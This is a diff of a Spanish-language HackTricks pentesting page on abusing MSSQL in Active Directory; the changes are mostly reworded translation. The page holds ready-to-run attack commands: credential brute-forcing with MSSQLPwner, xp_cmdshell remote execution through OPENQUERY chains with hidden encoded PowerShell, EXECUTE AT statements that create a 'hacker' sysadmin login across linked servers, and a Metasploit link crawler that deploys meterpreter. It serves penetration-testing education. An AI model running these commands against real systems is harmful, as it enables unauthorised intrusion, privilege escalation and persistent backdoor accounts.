@@ -1,4 +1,4 @@
-# Abuso de MSSQL AD
+# Abuso de MSSQL en AD
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -7,7 +7,7 @@
 
 ### Python
 
-La herramienta [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) se basa en impacket, y también permite autenticarse utilizando tickets kerberos, y atacar a través de cadenas de enlace.
+La herramienta [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) está basada en impacket y también permite autenticarse mediante tickets de Kerberos y atacar a través de cadenas de enlaces
 
 <figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
 ```shell
@@ -79,7 +79,7 @@ mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt
 mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
 
 ```
-### Enumerando desde la red sin sesión de dominio
+### Enumeración desde la red sin sesión de dominio
 ```
 
 # Interactive mode
@@ -90,11 +90,11 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
 ---
 ###  Powershell
 
-El módulo de powershell [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) es muy útil en este caso.
+El módulo de Powershell [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) es muy útil en este caso.
 ```bash
 Import-Module .\PowerupSQL.psd1
 ````
-### Enumerando desde la red sin sesión de dominio
+### Enumeración desde la red sin una sesión de dominio
 ```bash
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -108,7 +108,7 @@ Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads
 #The discovered MSSQL servers must be on the file: C:\temp\instances.txt
 Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
 ```
-### Enumerando desde dentro del dominio
+### Enumeración desde dentro del dominio
 ```bash
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -133,9 +133,9 @@ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 # Get DBs, test connections and get info in oneliner
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
 ```
-## Abuso Básico de MSSQL
+## Abuso básico de MSSQL
 
-### Acceso a DB
+### Acceder a la DB
 ```bash
 # List databases
 Get-SQLInstanceDomain | Get-SQLDatabase
@@ -161,24 +161,25 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ```
 ### MSSQL RCE
 
-También podría ser posible **ejecutar comandos** dentro del host de MSSQL.
+También podría ser posible **ejecutar comandos** dentro del host MSSQL
 ```bash
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
-Verifique en la página mencionada en la **siguiente sección cómo hacerlo manualmente.**
+Comprueba en la página mencionada en la **siguiente sección cómo hacerlo manualmente.**
 
-### Trucos Básicos de Hacking en MSSQL
+### MSSQL Basic Hacking Tricks
+
 
 {{#ref}}
 ../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/
 {{#endref}}
 
-## Enlaces de Confianza en MSSQL
+## MSSQL Trusted Links
 
-Si una instancia de MSSQL es confiable (enlace de base de datos) por otra instancia de MSSQL. Si el usuario tiene privilegios sobre la base de datos confiable, podrá **utilizar la relación de confianza para ejecutar consultas también en la otra instancia**. Estas confianzas pueden encadenarse y en algún momento el usuario podría encontrar alguna base de datos mal configurada donde pueda ejecutar comandos.
+Si una instancia de MSSQL es de confianza (database link) para otra instancia de MSSQL. Si el usuario tiene privilegios sobre la base de datos de confianza, podrá **usar la relación de confianza para ejecutar consultas también en la otra instancia**. Estas relaciones de confianza se pueden encadenar y, en algún momento, el usuario podría encontrar alguna base de datos mal configurada en la que pueda ejecutar comandos.
 
-**Los enlaces entre bases de datos funcionan incluso a través de confianzas de bosque.**
+**Los enlaces entre bases de datos funcionan incluso entre forest trusts.**
 
 ### Abuso de Powershell
 ```bash
@@ -220,30 +221,30 @@ inject-assembly 4704 ../SharpCollection/SharpSQLPwn.exe /modules:LIC /linkedsql:
 ```
 ### Metasploit
 
-Puedes verificar fácilmente los enlaces de confianza utilizando metasploit.
+Puedes comprobar fácilmente los enlaces de confianza usando metasploit.
 ```bash
 #Set username, password, windows auth (if using AD), IP...
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-Notice que metasploit intentará abusar solo de la función `openquery()` en MSSQL (así que, si no puedes ejecutar comandos con `openquery()`, necesitarás intentar el método `EXECUTE` **manualmente** para ejecutar comandos, ver más abajo).
+Ten en cuenta que metasploit intentará abusar únicamente de la función `openquery()` en MSSQL (por lo tanto, si no puedes ejecutar comandos con `openquery()`, tendrás que probar manualmente el método `EXECUTE` para ejecutar comandos; consulta más abajo).
 
 ### Manual - Openquery()
 
-Desde **Linux** podrías obtener un shell de consola MSSQL con **sqsh** y **mssqlclient.py.**
+Desde **Linux** puedes obtener una shell de consola MSSQL con **sqsh** y **mssqlclient.py.**
 
-Desde **Windows** también podrías encontrar los enlaces y ejecutar comandos manualmente usando un **cliente MSSQL como** [**HeidiSQL**](https://www.heidisql.com)
+Desde **Windows** también puedes encontrar los enlaces y ejecutar comandos manualmente usando un **cliente MSSQL como** [**HeidiSQL**](https://www.heidisql.com)
 
-_Inicia sesión usando autenticación de Windows:_
+_Inicia sesión usando la autenticación de Windows:_
 
-![](<../../images/image (808).png>)
+![Metasploit - Manual - Openquery(): Iniciar sesión usando la autenticación de Windows](<../../images/image (808).png>)
 
-#### Encontrar enlaces confiables
+#### Encontrar enlaces de confianza
 ```sql
 select * from master..sysservers;
 EXEC sp_linkedservers;
 ```
-![](<../../images/image (716).png>)
+![Manual - Openquery() - Encontrar enlaces confiables: EXEC sp linkedservers;](<../../images/image (716).png>)
 
 #### Ejecutar consultas en un enlace confiable
 
@@ -252,11 +253,11 @@ Ejecutar consultas a través del enlace (ejemplo: encontrar más enlaces en la n
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
 > [!WARNING]
-> Verifique dónde se utilizan comillas dobles y simples, es importante usarlas de esa manera.
+> Comprueba dónde se utilizan las comillas dobles y simples; es importante usarlas de esa manera.
 
-![](<../../images/image (643).png>)
+![Buscar enlaces confiables - Ejecuta consultas en un enlace confiable: Comprueba dónde se utilizan las comillas dobles y simples; es importante usarlas de esa manera](<../../images/image (643).png>)
 
-Puede continuar esta cadena de enlaces de confianza para siempre de forma manual.
+Puedes continuar manualmente esta cadena de enlaces confiables para siempre.
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -264,28 +265,28 @@ SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''p
 # Second level RCE
 SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
 ```
-Si no puedes realizar acciones como `exec xp_cmdshell` desde `openquery()`, intenta con el método `EXECUTE`.
+Si no puedes realizar acciones como `exec xp_cmdshell` desde `openquery()`, inténtalo con el método `EXECUTE`.
 
 ### Manual - EXECUTE
 
-También puedes abusar de enlaces de confianza utilizando `EXECUTE`:
+También puedes abusar de los enlaces de confianza usando `EXECUTE`:
 ```bash
 #Create user and give admin privileges
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 ```
-## Escalación de Privilegios Local
+## Escalada de privilegios local
 
-El **usuario local de MSSQL** generalmente tiene un tipo especial de privilegio llamado **`SeImpersonatePrivilege`**. Esto permite que la cuenta "imite a un cliente después de la autenticación".
+El **usuario local de MSSQL** normalmente tiene un tipo especial de privilegio llamado **`SeImpersonatePrivilege`**. Esto permite que la cuenta "suplante a un cliente después de la autenticación".
 
-Una estrategia que muchos autores han propuesto es forzar a un servicio del SISTEMA a autenticarse en un servicio malicioso o de intermediario que el atacante crea. Este servicio malicioso puede entonces imitar al servicio del SISTEMA mientras intenta autenticarse.
+Una estrategia que se les ha ocurrido a muchos autores consiste en forzar a un servicio SYSTEM a autenticarse en un servicio rogue o man-in-the-middle creado por el atacante. Este servicio rogue puede entonces suplantar al servicio SYSTEM mientras intenta autenticarse.
 
-[SweetPotato](https://github.com/CCob/SweetPotato) tiene una colección de estas diversas técnicas que se pueden ejecutar a través del comando `execute-assembly` de Beacon.
+[SweetPotato](https://github.com/CCob/SweetPotato) contiene una colección de estas técnicas, que se pueden ejecutar mediante el comando `execute-assembly` de Beacon.
 
 
 
-### Relevo NTLM del Punto de Gestión SCCM (Extracción de Secretos OSD)
-Vea cómo los roles SQL predeterminados de **Puntos de Gestión** de SCCM pueden ser abusados para volcar la Cuenta de Acceso a la Red y secretos de Secuencia de Tareas directamente desde la base de datos del sitio:
+### SCCM Management Point NTLM Relay (OSD Secret Extraction)
+Consulta cómo se pueden abusar de los roles SQL predeterminados de los **Management Points** de SCCM para extraer Network Access Account y secretos de Task-Sequence directamente de la base de datos del sitio:
 
 {{#ref}}
 sccm-management-point-relay-sql-policy-secrets.md
